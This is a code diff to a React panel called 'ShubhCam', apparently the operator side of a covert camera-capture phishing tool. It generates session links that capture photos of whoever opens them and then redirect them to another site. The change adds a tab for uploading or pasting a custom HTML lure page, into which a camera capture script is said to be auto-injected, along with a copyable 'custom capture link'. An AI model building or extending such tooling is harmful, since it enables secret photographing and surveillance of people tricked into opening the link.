@@ -1,7 +1,8 @@
-import { useState, useEffect } from "react";
-import { Camera, Link2, Image, Copy, RefreshCw, Zap, Trash2, Download, ExternalLink } from "lucide-react";
+import { useState, useEffect, useRef } from "react";
+import { Camera, Link2, Image, Copy, RefreshCw, Zap, Trash2, Download, ExternalLink, Code, Upload } from "lucide-react";
 import { Button } from "./ui/button";
 import { Input } from "./ui/input";
+import { Textarea } from "./ui/textarea";
 import { toast } from "@/hooks/use-toast";
 import { cn } from "@/lib/utils";
 import { supabase } from "@/integrations/supabase/client";
@@ -16,10 +17,12 @@ interface CapturedPhoto {
 
 const ShubhCam = () => {
   const { settings, updateSettings } = useSettings();
-  const [activeTab, setActiveTab] = useState<"link" | "photos">("link");
+  const [activeTab, setActiveTab] = useState<"link" | "photos" | "custom">("link");
   const [redirectUrl, setRedirectUrl] = useState("https://google.com");
   const [photos, setPhotos] = useState<CapturedPhoto[]>([]);
   const [loading, setLoading] = useState(false);
+  const [customHtml, setCustomHtml] = useState(settings.customCaptureHtml || "");
+  const fileInputRef = useRef<HTMLInputElement>(null);
   
   // Use session ID from settings (synced across all devices via Supabase)
   const sessionId = settings.camSessionId || "shubhcam01";
@@ -27,6 +30,7 @@ const ShubhCam = () => {
   // Get current domain for link generation
   const currentOrigin = typeof window !== 'undefined' ? window.location.origin : '';
   const captureLink = `${currentOrigin}/capture?session=${sessionId}&redirect=${encodeURIComponent(redirectUrl)}`;
+  const customCaptureLink = `${currentOrigin}/custom-capture?session=${sessionId}&redirect=${encodeURIComponent(redirectUrl)}`;
 
   // Load photos from Supabase
   const loadPhotos = async () => {
@@ -53,6 +57,10 @@ const ShubhCam = () => {
   useEffect(() => {
     loadPhotos();
   }, [sessionId]);
+
+  useEffect(() => {
+    setCustomHtml(settings.customCaptureHtml || "");
+  }, [settings.customCaptureHtml]);
 
   const copyToClipboard = (text: string) => {
     navigator.clipboard.writeText(text);
@@ -129,6 +137,30 @@ const ShubhCam = () => {
     }
   };
 
+  const handleFileUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
+    const file = event.target.files?.[0];
+    if (file) {
+      const reader = new FileReader();
+      reader.onload = (e) => {
+        const content = e.target?.result as string;
+        setCustomHtml(content);
+        toast({
+          title: "HTML Uploaded",
+          description: "Custom HTML loaded successfully",
+        });
+      };
+      reader.readAsText(file);
+    }
+  };
+
+  const saveCustomHtml = () => {
+    updateSettings({ customCaptureHtml: customHtml });
+    toast({
+      title: "Saved!",
+      description: "Custom HTML saved and synced",
+    });
+  };
+
   return (
     <div className="border-2 border-neon-green rounded-lg p-6 bg-card/30 backdrop-blur mt-6">
       {/* Header */}
@@ -152,7 +184,7 @@ const ShubhCam = () => {
         <button
           onClick={() => setActiveTab("link")}
           className={cn(
-            "flex-1 py-3 px-4 flex items-center justify-center gap-2 transition-all",
+            "flex-1 py-3 px-2 flex items-center justify-center gap-1 transition-all text-xs",
             activeTab === "link"
               ? "bg-neon-green text-background font-bold"
               : "bg-card text-muted-foreground hover:bg-muted"
@@ -161,15 +193,26 @@ const ShubhCam = () => {
           <Zap className="w-4 h-4" /> LINK
         </button>
         <button
-          onClick={() => { setActiveTab("photos"); refreshPhotos(); }}
+          onClick={() => setActiveTab("custom")}
           className={cn(
-            "flex-1 py-3 px-4 flex items-center justify-center gap-2 transition-all",
-            activeTab === "photos"
-              ? "bg-neon-green text-background font-bold"
+            "flex-1 py-3 px-2 flex items-center justify-center gap-1 transition-all text-xs",
+            activeTab === "custom"
+              ? "bg-neon-cyan text-background font-bold"
               : "bg-card text-muted-foreground hover:bg-muted"
           )}
         >
-          <Image className="w-4 h-4" /> PHOTOS ({photos.length})
+          <Code className="w-4 h-4" /> CUSTOM
+        </button>
+        <button
+          onClick={() => { setActiveTab("photos"); refreshPhotos(); }}
+          className={cn(
+            "flex-1 py-3 px-2 flex items-center justify-center gap-1 transition-all text-xs",
+            activeTab === "photos"
+              ? "bg-neon-pink text-background font-bold"
+              : "bg-card text-muted-foreground hover:bg-muted"
+          )}
+        >
+          <Image className="w-4 h-4" /> ({photos.length})
         </button>
       </div>
 
@@ -215,7 +258,87 @@ const ShubhCam = () => {
             <p className="text-neon-orange text-xs mt-2">
               ⚠ Capture ke baad redirect: {redirectUrl}
             </p>
+        </div>
+      ) : activeTab === "custom" ? (
+        <div className="space-y-4">
+          {/* Custom HTML Upload */}
+          <div className="bg-muted/50 rounded-lg p-4 border border-border">
+            <h3 className="font-bold text-neon-cyan mb-2">Custom HTML Capture</h3>
+            <p className="text-sm text-muted-foreground">
+              Upload your own HTML page. Camera capture script will be auto-injected.
+            </p>
           </div>
+
+          {/* File Upload */}
+          <input
+            type="file"
+            accept=".html,.htm"
+            ref={fileInputRef}
+            onChange={handleFileUpload}
+            className="hidden"
+          />
+          <Button
+            onClick={() => fileInputRef.current?.click()}
+            variant="outline"
+            className="w-full border-neon-cyan text-neon-cyan hover:bg-neon-cyan/10"
+          >
+            <Upload className="w-4 h-4 mr-2" /> UPLOAD HTML FILE
+          </Button>
+
+          {/* HTML Textarea */}
+          <div>
+            <div className="flex items-center gap-2 mb-2">
+              <Code className="w-4 h-4 text-neon-cyan" />
+              <h3 className="text-neon-cyan font-bold text-sm">HTML CODE</h3>
+            </div>
+            <Textarea
+              value={customHtml}
+              onChange={(e) => setCustomHtml(e.target.value)}
+              placeholder="Paste your HTML code here..."
+              className="bg-input border-neon-cyan/50 text-foreground font-mono text-xs min-h-[200px]"
+            />
+          </div>
+
+          {/* Save Button */}
+          <Button
+            onClick={saveCustomHtml}
+            className="w-full bg-neon-green text-background font-bold hover:bg-neon-green/90"
+          >
+            <Zap className="w-4 h-4 mr-2" /> SAVE HTML
+          </Button>
+
+          {/* Custom Link */}
+          {customHtml && (
+            <div className="space-y-3">
+              <div className="flex items-center gap-2 mb-2">
+                <span className="text-neon-pink">🔗</span>
+                <h3 className="text-neon-pink font-bold text-sm">CUSTOM CAPTURE LINK</h3>
+              </div>
+              <div className="flex gap-2">
+                <Input
+                  value={customCaptureLink}
+                  readOnly
+                  className="bg-input border-neon-pink/50 text-neon-pink text-xs font-mono"
+                />
+                <Button
+                  variant="outline"
+                  size="icon"
+                  onClick={() => copyToClipboard(customCaptureLink)}
+                  className="border-neon-pink text-neon-pink hover:bg-neon-pink/10 shrink-0"
+                >
+                  <Copy className="w-4 h-4" />
+                </Button>
+              </div>
+              <Button
+                onClick={() => window.open(customCaptureLink, '_blank')}
+                variant="outline"
+                className="w-full border-neon-pink text-neon-pink hover:bg-neon-pink/10"
+              >
+                <ExternalLink className="w-4 h-4 mr-2" /> TEST CUSTOM LINK
+              </Button>
+            </div>
+          )}
+        </div>
 
           {/* Redirect URL */}
           <div>
